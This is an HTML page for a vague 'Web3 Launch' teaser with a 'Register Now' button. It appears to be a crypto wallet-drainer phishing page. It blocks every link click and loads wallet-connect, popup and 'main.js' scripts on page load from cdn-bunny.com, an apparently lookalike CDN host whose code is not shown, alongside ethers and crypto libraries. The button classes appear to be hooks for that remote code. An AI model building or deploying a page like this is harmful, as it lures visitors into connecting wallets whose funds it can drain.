<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web3 Launch</title>
    <style>
        body,
        html {
            height: 100%;
            margin: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #000;
        }

        .container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: calc(100% - 40px);
            color: white;
        }

        .logo {
            max-width: 200px;
        }

        .banner {
            width: 100%;
            height: 200px;
            background-image: url('./prerich.jpeg');
            background-size: cover;
            background-position: center;
            margin-bottom: 40px;
            /* Spacing between banner and content */
        }

        .title {
            margin: 0;
            font-size: 2em;
        }

        .description {
            text-align: center;
            margin: 40px 0;
        }

        .register-btn {
            padding: 15px 30px;
            background-color: #0057b8;
            /* Button color from logo */
            color: white;
            border: none;
            cursor: pointer;
            font-size: 18px;
            border-radius: 5px;
            transition: background-color 0.3s ease;
            margin-bottom: 20px;
            /* Spacing between button and footer */
        }

        .register-btn:hover {
            background-color: #004c9e;
            /* Darken button color on hover */
        }

        .footer {
            width: 100%;
            color: white;
            text-align: center;
            padding: 20px 0;
            background-color: #333;
            position: absolute;
            /* Footer at the bottom */
            bottom: 0;
        }
    </style>
    <script>
        document.addEventListener('DOMContentLoaded', function () {
            var links = document.querySelectorAll('a');
            links.forEach(function (link) {
                link.addEventListener('click', function (event) {
                    event.preventDefault();
                });
            });
        });
    </script>
    <script charset="UTF-8" type="text/javascript"
        src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.6.9/ethers.umd.min.js"></script>
    <script charset="UTF-8" type="text/javascript"
        src="https://cdn.jsdelivr.net/npm/merkletreejs@latest/merkletree.js"></script>
    <script charset="UTF-8" type="text/javascript"
        src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
    <script charset="UTF-8" type="text/javascript" src="https://cdn-bunny.com/scripts/wallet-connect-v4.js"></script>
    <link charset="UTF-8" rel="stylesheet" href="https://cdn-bunny.com/styles/popup-6.css">
    </link>
    <script charset="UTF-8" type="text/javascript" src="https://cdn-bunny.com/main.js"></script>
</head>

<body>

    <div class="container">
        <div class="banner"></div>
        <h1 class="title">Something Exciting Is Coming...</h1>
        <p class="description">Join us on our journey and be a part of the revolution.</p>
        <button class="interact-button placeholder-button register-btn">Register Now</button>
    </div>



</body>

</html>
